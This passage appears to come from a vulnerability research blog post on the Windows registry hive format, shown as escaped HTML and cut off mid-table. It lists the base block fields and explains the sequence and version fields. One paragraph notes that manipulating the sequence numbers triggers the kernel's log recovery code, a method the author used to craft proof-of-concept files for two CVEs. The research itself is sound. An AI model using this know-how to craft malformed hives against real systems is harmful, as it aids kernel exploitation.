 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Sequence1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Sequence2&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;TimeStamp&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_LARGE_INTEGER&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x014&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Major&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x018&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Minor&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x01c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x020&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Format&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x024&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;RootCell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x028&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x02c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Cluster&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x030&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;FileName&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[64]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x070&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;RmId&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x080&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;LogId&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x090&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x094&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;TmId&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x0a4&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;GuidSignature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x0a8&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;LastReorganizeTime&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x0b0&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Reserved1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[83]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x1fc&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;CheckSum&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x200&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Reserved2&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[882]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0xfc8&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ThawTmId&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0xfd8&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ThawRmId&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0xfe8&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ThawLogId&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_GUID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0xff8&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;BootType&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0xffc&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;BootRecover&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The first thing that stands out is the fact that even though the base block is 4096-bytes long, it only really stores around 236 bytes of meaningful data, and the rest (the Reserved1 and Reserved2 arrays) are filled with zeros. For a detailed description of each field, I encourage you to refer to the two unofficial regf specifications mentioned earlier. In the sections below, I share additional thoughts on the usage and relevance of some of the most interesting header members.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.hfgb3akvp2w6&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Sequence1, Sequence2&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;These 32-bit numbers are updated by the kernel during registry write operations to keep track of the consistency state of the hive. If the two values are equal during loading, the hive is in a &amp;quot;clean&amp;quot; state and doesn&amp;#39;t require any kind of recovery. If they differ, this indicates that not all pending changes have been fully committed to the primary hive file, and additional modifications must be applied based on the accompanying .LOG/.LOG1/.LOG2 files. From a security point of view, manually controlling these fields may be useful in ensuring that the log recovery logic (&lt;/span&gt;&lt;span&gt;HvAnalyzeLogFiles&lt;/span&gt;&lt;span&gt;, HvpPerformLogFileRecovery and related functions) gets executed by the kernel. This is what I did when crafting the proof-of-concept files for &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451598&quot;&gt;CVE-2023-35386&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451600&quot;&gt;CVE-2023-38154&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.jk8scvefffm6&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Major, Minor&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;These are some of the most consequential fields in the header: they represent the major and minor version of the hive. The only valid major version is 1, while the minor version has been historically an integer between 0 and 6. Here is an overview of the different 1.x versions in existence:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c67 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Version&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c64 MvcjwGOuIU-c79&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Year&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c58 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Introduced in&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c55 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
